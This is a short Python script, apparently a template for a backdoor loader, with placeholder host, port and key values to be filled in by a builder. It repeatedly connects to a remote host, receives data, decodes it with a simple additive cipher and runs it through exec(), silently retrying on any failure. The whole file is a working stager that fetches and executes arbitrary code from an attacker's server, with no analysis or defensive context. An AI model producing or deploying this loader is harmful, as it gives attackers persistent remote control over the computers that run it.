import socket
import time

def enctry(s,k):
    k*=0xFFFF
    encry_str = ""
    for i,j in zip(s,k):
        temp = str(ord(i)+ord(j))+'_'
        encry_str = encry_str + temp
    return encry_str

def dectry(p,k):
    k*=0xFFFF
    dec_str = ""
    for i,j in zip(p.split("_")[:-1],k):
        temp = chr(int(i) - ord(j))
        dec_str = dec_str+temp
    return dec_str
ip = '{PREPPER HOST}'
port = {PREPPER PORT}
md5 = '{PREPPER MD5}'

while True:
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((ip, port))
        response = server.recv(81962)
        response = response.decode('gbk')
        response = dectry(response, md5).replace("{PREPPER IP}", ip)
        exec(response)
    except:
        time.sleep(3)